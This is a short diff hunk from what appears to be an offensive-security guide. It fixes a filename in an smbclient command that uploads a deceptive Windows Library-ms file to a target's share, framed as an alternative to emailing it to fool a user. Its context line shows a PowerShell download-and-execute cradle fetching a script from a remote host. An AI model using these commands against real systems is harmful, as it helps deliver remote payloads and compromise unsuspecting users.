@@ -81,7 +81,7 @@ powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://m
 ```
 Instead of sending the Library file by email, it can be shared by Samba:
 ```
-smbclient //$TargetIp/$TargetSharedDirectory -c 'put myautomatedfakeinstalltofoolsomeuser.Library-ms.Library-ms'
+smbclient //$TargetIp/$TargetSharedDirectory -c 'put myautomatedfakeinstalltofoolsomeuser.Library-ms'
 ```
 
 
